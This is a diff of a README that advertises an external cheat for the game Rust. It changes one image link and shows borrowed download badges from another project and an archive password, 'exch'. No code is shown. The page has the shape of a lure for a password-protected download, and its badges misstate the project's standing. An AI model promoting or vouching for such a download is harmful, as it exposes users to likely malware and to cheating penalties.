@@ -1,5 +1,5 @@
 # EXTERNAL HACK FOR RUST [![Github All Releases](https://img.shields.io/github/downloads/SecHex/SecHex-Spoofy/total)]() [![Codacy Badge](https://app.codacy.com/project/badge/Grade/0d4fdc1daca5402a8c57efc3bef73d31)]()
-![downloadstats](https://github.com/EugeneWalk244/release-eugenewalk/assets/163557982/93b2b1ae-9806-4926-97b7-833820163371)
+![downloadstats](https://github.com/EugeneWalk244/release-eugenewalk/assets/163557982/74a4769f-7f4b-4a6b-a58a-be3fba995557)
 > Password: exch
 
 ![1111](https://github.com/EugeneWalk244/release-eugenewalk/assets/163557982/922381e0-53c9-4314-b13f-4b0e805f4e8a)
